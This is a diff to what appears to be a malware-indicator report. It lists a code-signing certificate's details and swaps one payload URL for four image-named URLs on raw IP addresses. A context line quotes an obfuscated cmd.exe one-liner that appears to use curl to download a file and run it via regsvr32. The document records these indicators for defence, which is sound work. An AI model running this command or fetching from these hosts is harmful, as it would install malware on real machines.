@@ -15,10 +15,8 @@ Algorithm:  sha384WithRSAEncryption
 Valid from: 2022-03-16T00:00:00Z
 Valid to:   2023-03-16T23:59:59Z
 Serial number:   ff52eb011bb748fee75153cbe1e50dd6
-Intelligence:    2 malware samples on MalwareBazaar are signed with this code signing certificate
 Thumbprint Algorithm:   SHA256
 Thumbprint:  c75025c80ab583a6ab87070e5b65c93cb59b48e0cbb5f99113e354a96f8fcd39
-Source: This information was brought to you by ReversingLabs A1000 Malware Analysis Platform
 
 ******************************
 
@@ -36,7 +34,11 @@ cmd.exe" /c set r1=regsv&& set cu=cur&&call C:\Windows\system32\%cu%l -s -o C:\U
 
 ******************************
 
-http://103.155.93.201/giveOutThe.jpg
+http://103.155.93.201/anything.jpg
+http://158.247.204.173/anything.jpg
+http://95.174.65.251/anything.jpg
+http://77.83.198.21/anything.jpg
+
 
 *************************************************
 
